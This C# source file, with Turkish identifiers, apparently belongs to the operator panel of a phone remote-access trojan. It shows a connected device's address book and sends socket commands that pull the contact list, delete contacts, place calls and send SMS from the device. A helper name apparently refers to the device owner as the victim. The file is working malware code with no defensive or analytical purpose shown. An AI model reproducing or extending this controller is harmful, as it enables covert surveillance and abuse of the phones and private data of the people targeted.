using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace SV
{
    public partial class Rehber : MetroFramework.Forms.MetroForm
    {
        Socket sco; public string ID = "";
        public Rehber(Socket sck, string aydi)
        {
            InitializeComponent();
            ID = aydi; sco = sck;
        }
        List<ListViewItem> lArray  = new List<ListViewItem>();
        public void bilgileriIsle(string arg)
        {
            listView1.Items.Clear();
            lArray.Clear();
            if (arg != "REHBER YOK")
            {
                string[] ana_Veriler = arg.Split('&');           
                for (int k = 0; k < ana_Veriler.Length; k++)
                {
                    try
                    {
                        string[] bilgiler = ana_Veriler[k].Split('=');                
                        ListViewItem item = new ListViewItem(bilgiler[0]);
                        item.ImageIndex = 0;
                        item.SubItems.Add(bilgiler[1]);
                        lArray.Add(item);
                    }
                    catch (Exception) { }
                }
                listView1.Items.AddRange(lArray.ToArray());
            }
            else
            {
                ListViewItem item = new ListViewItem("There is no Contact");
                listView1.Items.Add(item);
            }
        }
        private void addToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new Ekle(sco).Show();
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                byte[] senddata = Form1.MyDataPacker("REHBERSIL", Encoding.UTF8.GetBytes(listView1.SelectedItems[0].Text));
                sco.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                listView1.SelectedItems[0].Remove();
                Text = "Adress Book - " + ((Form1)Application.OpenForms["Form1"]).krbnIsminiBul(sco.Handle.ToString());
            }
            catch (Exception) { }
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                byte[] senddata = Form1.MyDataPacker("REHBERIVER", Encoding.UTF8.GetBytes("ECHO"));
                sco.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                Text = "Adress Book - " + ((Form1)Application.OpenForms["Form1"]).krbnIsminiBul(sco.Handle.ToString());
            }
            catch (Exception) { }
        }

        private void callToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                try
                {
                    byte[] senddata = Form1.MyDataPacker("ARA", Encoding.UTF8.GetBytes(listView1.SelectedItems[0].SubItems[1].Text));
                    sco.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                }
                catch (Exception) { }
            }
        }

        private void sendSMSToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                new SMS(sco, listView1.SelectedItems[0].SubItems[1].Text) { Text = "SMS - " +Text.Replace("Adress Book - ", "") }.Show();
            }
        }

        private void copyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                Clipboard.SetText(listView1.SelectedItems[0].SubItems[1].Text);
            }
        }
    }
}
